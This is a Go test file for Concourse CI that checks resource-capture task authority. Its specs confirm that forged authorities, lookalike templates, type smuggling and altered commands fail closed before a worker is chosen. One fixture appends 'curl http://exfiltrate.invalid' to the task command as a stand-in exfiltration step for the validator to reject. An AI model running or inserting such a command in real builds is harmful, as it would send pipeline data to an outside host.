package exec_test

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"time"

	"github.com/concourse/concourse/agent/resourcecapture"
	"github.com/concourse/concourse/agent/snapshot"
	"github.com/concourse/concourse/atc"
	"github.com/concourse/concourse/atc/builds"
	"github.com/concourse/concourse/atc/db"
	"github.com/concourse/concourse/atc/exec"
	"github.com/concourse/concourse/atc/exec/build"
	"github.com/concourse/concourse/atc/exec/execfakes"
	"github.com/concourse/concourse/atc/runtime"
	"github.com/concourse/concourse/atc/runtime/runtimetest"
	"github.com/concourse/concourse/tracing"
	"github.com/concourse/concourse/vars"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
)

// The resource-capture adapter is the sanctioned untyped -> typed boundary: its
// task consumes ordinary resource bytes and emits the first typed snapshot.
// Nothing used to cross the render/execute boundary in tests, so the shape the
// renderer produced was rejected by exec for every snapshot type. These specs
// plan a real rendered capture template and run it through exec.

type captureRenderStores struct {
	spec resourcecapture.TemplateSpec
}

func (stores *captureRenderStores) Resolve(context.Context, resourcecapture.ResolveRequest) (resourcecapture.ResolvedResource, bool, error) {
	return resourcecapture.ResolvedResource{
		TeamID: 7, TeamName: "main",
		Pipeline:              atc.PipelineRef{Name: "delivery"},
		PipelineConfigVersion: 11,
		Resource: atc.ResourceConfig{
			Name: "repository", Type: "git",
			Source: atc.Source{"uri": "git@example.invalid:acme/repo.git"},
		},
		ResourceTypes:           atc.ResourceTypes{{Name: "git", Type: "registry-image", Source: atc.Source{"repository": "acme/git-resource"}}},
		ResourceConfigVersionID: 31,
		Version:                 atc.Version{"ref": "abc123"},
		Enabled:                 true,
		CapturedAt:              time.Date(2026, time.August, 2, 12, 0, 0, 0, time.UTC),
	}, true, nil
}

func (stores *captureRenderStores) SaveOrReuse(_ context.Context, spec resourcecapture.TemplateSpec) (resourcecapture.TemplateRef, error) {
	stores.spec = spec.Clone()
	return resourcecapture.TemplateRef{ID: 41, TeamID: spec.TeamID, Name: spec.Name}, nil
}

func (stores *captureRenderStores) StartOrGet(_ context.Context, request resourcecapture.ExecutionRequest) (resourcecapture.Execution, bool, error) {
	return resourcecapture.Execution{
		PipelineRunID: 51, TemplatePipelineID: request.Template.ID,
		InstancePipelineID: 61, Status: db.PipelineRunRunning,
	}, true, nil
}

func (stores *captureRenderStores) Finalize(context.Context, resourcecapture.OutputRequest) (snapshot.Snapshot, bool, error) {
	return snapshot.Snapshot{}, false, errors.New("no capture output should be finalized while the run is still running")
}

// renderCaptureTemplate produces exactly the pipeline the server would save for
// `fly agent snapshots capture-resource`, and returns the template pipeline
// name the server-side ownership chain would authenticate for its builds.
func renderCaptureTemplate() resourcecapture.TemplateSpec {
	stores := new(captureRenderStores)
	capturer, err := resourcecapture.NewCapturer(
		stores, stores, stores, stores,
		"ghcr.io/acme/agent-runner@sha256:"+strings.Repeat("a", 64),
	)
	Expect(err).NotTo(HaveOccurred())

	_, err = capturer.Capture(context.Background(), resourcecapture.Request{
		TeamID: 7, TeamName: "main", Pipeline: atc.PipelineRef{Name: "delivery"},
		Resource: "repository", Version: atc.Version{"ref": "abc123"},
		CreatedBy: "alice", Actor: "github:subject-1",
	})
	Expect(err).NotTo(HaveOccurred())
	Expect(stores.spec.Name).NotTo(BeEmpty())
	return stores.spec
}

// planCaptureTask walks the rendered task the whole way a saved template
// actually travels: materialized into the run instance config (a full
// marshal/unmarshal round trip through the step decoder) and then through the
// ordinary build planner.
func planCaptureTask(spec resourcecapture.TemplateSpec) atc.Plan {
	instance, err := atc.MaterializeRunConfig(spec.Config, 1, 51, map[string]any{})
	Expect(err).NotTo(HaveOccurred())
	Expect(instance.Jobs).To(HaveLen(1))
	Expect(instance.Jobs[0].PlanSequence).To(HaveLen(2))
	task, ok := instance.Jobs[0].PlanSequence[1].Config.(*atc.TaskStep)
	Expect(ok).To(BeTrue())
	// A dropped or unknown-field authority here would silently reintroduce the
	// original bug at the persistence boundary.
	Expect(task.ResourceCaptureAuthority).NotTo(BeNil())
	Expect(instance.Jobs[0].PlanSequence[1].UnknownFields).To(BeEmpty())

	plan, err := builds.NewPlanner(atc.NewPlanFactory(0)).Create(
		task, db.SchedulerResources{}, instance.ResourceTypes, atc.Prototypes{}, nil, false,
	)
	Expect(err).NotTo(HaveOccurred())
	Expect(plan.Task).NotTo(BeNil())
	return plan
}

var _ = Describe("TaskStep resource capture authority", func() {
	var (
		ctx    context.Context
		cancel func()

		spec atc.Plan

		templateName string

		fakePool            *execfakes.FakePool
		fakeStreamer        *execfakes.FakeStreamer
		fakeDelegate        *execfakes.FakeTaskDelegate
		fakeDelegateFactory *execfakes.FakeTaskDelegateFactory

		outputSealer *recordingOutputSealer
		outputVolume *runtimetest.Volume

		state exec.RunState
		repo  *build.Repository

		stepMetadata      exec.StepMetadata
		containerMetadata db.ContainerMetadata

		taskPlan *atc.TaskPlan

		stepOk  bool
		stepErr error
	)

	BeforeEach(func() {
		ctx, cancel = context.WithCancel(context.Background())

		rendered := renderCaptureTemplate()
		templateName = rendered.Name
		spec = planCaptureTask(rendered)
		taskPlan = spec.Task

		fakeStreamer = new(execfakes.FakeStreamer)
		fakeDelegate = new(execfakes.FakeTaskDelegate)
		fakeDelegate.StdoutReturns(GinkgoWriter)
		fakeDelegate.StderrReturns(GinkgoWriter)
		fakeDelegate.StartSpanReturns(ctx, tracing.NoopSpan)
		fakeDelegate.FetchImageReturns(runtime.ImageSpec{ImageURL: "some-image"}, nil)
		fakeDelegateFactory = new(execfakes.FakeTaskDelegateFactory)
		fakeDelegateFactory.TaskDelegateReturns(fakeDelegate)

		state = exec.NewRunState(noopStepper, vars.StaticVariables{})
		repo = state.ArtifactRepository()
		// The `get` step ahead of the capture task registers ordinary,
		// untyped resource bytes. That is precisely the input that can never
		// be typed.
		repo.RegisterArtifact("source", runtimetest.NewVolume("source"), false)

		containerMetadata = db.ContainerMetadata{
			WorkingDirectory: "some-artifact-root",
			Type:             db.ContainerTypeTask,
			StepName:         "seal-snapshot",
		}
		stepMetadata = exec.StepMetadata{
			TeamID: 7, TeamName: "main", BuildID: 1234, JobID: 12345,
			SnapshotCreatedBy: "concourse",
			// Server-set: only the engine populates this, from the
			// pipeline_runs -> agent_workflow_run_templates ownership chain.
			ResourceCaptureTemplate: templateName,
		}

		digest, err := snapshot.ParseDigest("sha256:" + strings.Repeat("c", 64))
		Expect(err).NotTo(HaveOccurred())
		outputSealer = &recordingOutputSealer{result: map[string]snapshot.SealedOutput{
			"snapshot": {
				Port:     snapshot.Port{Name: "snapshot", Type: snapshot.TypeRef("repository/v1")},
				Snapshot: snapshot.SnapshotRef{ID: 91, Type: snapshot.TypeRef("repository/v1"), Digest: digest},
			},
		}}

		outputVolume = runtimetest.NewVolume("snapshot")
	})

	AfterEach(func() {
		cancel()
	})

	JustBeforeEach(func() {
		owner := db.NewBuildStepContainerOwner(stepMetadata.BuildID, spec.ID, stepMetadata.TeamID)
		worker := runtimetest.NewWorker("worker").
			WithContainer(owner, runtimetest.NewContainer().WithProcess(
				runtime.ProcessSpec{
					ID:   "task",
					Path: "/bin/sh",
					Args: []string{"-ec", "cp -a source/. snapshot/"},
					Dir:  "some-artifact-root",
					TTY: &runtime.TTYSpec{
						WindowSize: runtime.WindowSize{Columns: 500, Rows: 500},
					},
				},
				runtimetest.ProcessStub{Attachable: true},
			), nil)
		worker.Containers[0].Mounts = []runtime.VolumeMount{{
			Volume: outputVolume, MountPath: "some-artifact-root/snapshot/",
		}}
		fakePool = new(execfakes.FakePool)
		fakePool.FindOrSelectWorkerReturns(worker, nil)

		snapshotMetadata, snapshotContent := snapshotStoresForSealedOutputs(outputSealer.result)
		step := exec.NewTaskStep(
			spec.ID,
			*taskPlan,
			atc.ContainerLimits{},
			atc.ContainerLimits{},
			stepMetadata,
			containerMetadata,
			fakePool,
			fakeStreamer,
			fakeDelegateFactory,
			0,
			exec.WithTaskOutputSealer(outputSealer),
			exec.WithTaskSnapshotStores(snapshotMetadata, snapshotContent),
		)
		stepOk, stepErr = step.Run(ctx, state)
	})

	It("renders a capture task that survives exec validation and seals the first typed snapshot", func() {
		Expect(stepErr).NotTo(HaveOccurred())
		Expect(stepOk).To(BeTrue())

		Expect(taskPlan.ResourceCaptureAuthority).NotTo(BeNil())
		Expect(taskPlan.SnapshotInputs).To(BeEmpty())
		Expect(taskPlan.Config.Inputs).To(Equal([]atc.TaskInputConfig{{Name: "source"}}))

		Expect(outputSealer.calls).To(HaveLen(1))
		request := outputSealer.calls[0]
		Expect(request.StepKind).To(Equal("task"))
		Expect(request.StepName).To(Equal("seal-snapshot"))
		Expect(request.Inputs).To(BeEmpty())
		Expect(request.OutputDeclarations).To(Equal([]snapshot.Port{{
			Name: "snapshot", Type: snapshot.TypeRef("repository/v1"),
		}}))

		var metadata resourcecapture.SourceMetadata
		Expect(json.Unmarshal(request.Outputs[0].SourceMetadata, &metadata)).To(Succeed())
		Expect(metadata.Adapter).To(Equal(resourcecapture.AdapterResourceVersion))
		Expect(metadata.OperationKey).To(Equal(taskPlan.ResourceCaptureAuthority.OperationKey))

		entry, found := repo.ArtifactEntryFor("snapshot")
		Expect(found).To(BeTrue())
		Expect(entry.Snapshot).NotTo(BeNil())
		Expect(entry.Snapshot.Type).To(Equal(snapshot.TypeRef("repository/v1")))
	})

	Context("when the authority is forged in a hand-authored ordinary pipeline", func() {
		BeforeEach(func() {
			// Exactly what a pipeline author can write: the whole rendered
			// task, function_id and authority struct included. What they
			// cannot produce is the server-set capture template association.
			stepMetadata.ResourceCaptureTemplate = ""
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(MatchError(ContainSubstring("resource capture authority is not bound to a server-owned capture template")))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
			Expect(outputSealer.calls).To(BeEmpty())
		})
	})

	Context("when the forged authority names a lookalike template the author controls", func() {
		BeforeEach(func() {
			// A pipeline literally named agent-resource-capture-<...> still
			// never reaches exec with this field set, but prove the operation
			// key binding too: a mismatched key must not be honored.
			stepMetadata.ResourceCaptureTemplate = "agent-resource-capture-" +
				strings.Repeat("b", 24) + "-" + strings.Repeat("b", 12)
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(MatchError(ContainSubstring("resource capture authority is not bound to a server-owned capture template")))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})

	Context("when an authorized capture task declares an extra untyped output", func() {
		BeforeEach(func() {
			taskPlan.Config.Outputs = append(taskPlan.Config.Outputs, atc.TaskOutputConfig{Name: "hidden"})
		})

		It("still fails exact output coverage before worker selection", func() {
			Expect(stepErr).To(MatchError(ContainSubstring("every declared task output must be typed")))
			Expect(stepErr).To(MatchError(ContainSubstring("hidden")))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})

	Context("when an authorized capture task has an untyped output instead of the typed one", func() {
		BeforeEach(func() {
			taskPlan.SnapshotOutputs = nil
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(HaveOccurred())
			Expect(stepErr).To(MatchError(ContainSubstring("authoritative resource capture")))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})

	Context("when an authorized capture task also declares a typed input", func() {
		BeforeEach(func() {
			taskPlan.SnapshotInputs = map[string]atc.SnapshotInputConfig{
				"source": {Type: snapshot.TypeRef("repository/v1")},
			}
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(MatchError(ContainSubstring("authoritative resource capture")))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})

	Context("when the authorized capture task's source resolves to a typed snapshot", func() {
		BeforeEach(func() {
			// The waiver removes the exact-coverage rule, never the smuggling
			// guard: an already-typed artifact must not slip in through the
			// untyped port and be re-sealed under a new type.
			digest, err := snapshot.ParseDigest("sha256:" + strings.Repeat("d", 64))
			Expect(err).NotTo(HaveOccurred())
			ref := snapshot.SnapshotRef{ID: 42, Type: snapshot.TypeRef("repository/v1"), Digest: digest}
			Expect(repo.RegisterArtifacts(map[build.ArtifactName]build.ArtifactEntry{
				"source": {Artifact: runtimetest.NewVolume("source"), Snapshot: &ref},
			})).To(Succeed())
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(MatchError(ContainSubstring(`task input "source" is a typed snapshot but has no input_types declaration`)))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})

	Context("when an authorized capture task is retargeted at a different command", func() {
		BeforeEach(func() {
			taskPlan.Config.Run.Args = []string{"-ec", "cp -a source/. snapshot/ && curl http://exfiltrate.invalid"}
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(MatchError(ContainSubstring("authoritative resource capture")))
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})

	Context("when a capture authority is used to mint a validation snapshot", func() {
		BeforeEach(func() {
			taskPlan.SnapshotOutputs = map[string]atc.SnapshotOutputConfig{
				"snapshot": {
					Type:           snapshot.TypeRef("validation/v1"),
					Retention:      snapshot.RetentionClassBinding,
					SourceMetadata: taskPlan.SnapshotOutputs["snapshot"].SourceMetadata,
				},
			}
			taskPlan.ResourceCaptureAuthority.SnapshotType = snapshot.TypeRef("validation/v1")
		})

		It("fails closed before worker selection", func() {
			Expect(stepErr).To(HaveOccurred())
			Expect(fakePool.FindOrSelectWorkerCallCount()).To(Equal(0))
		})
	})
})
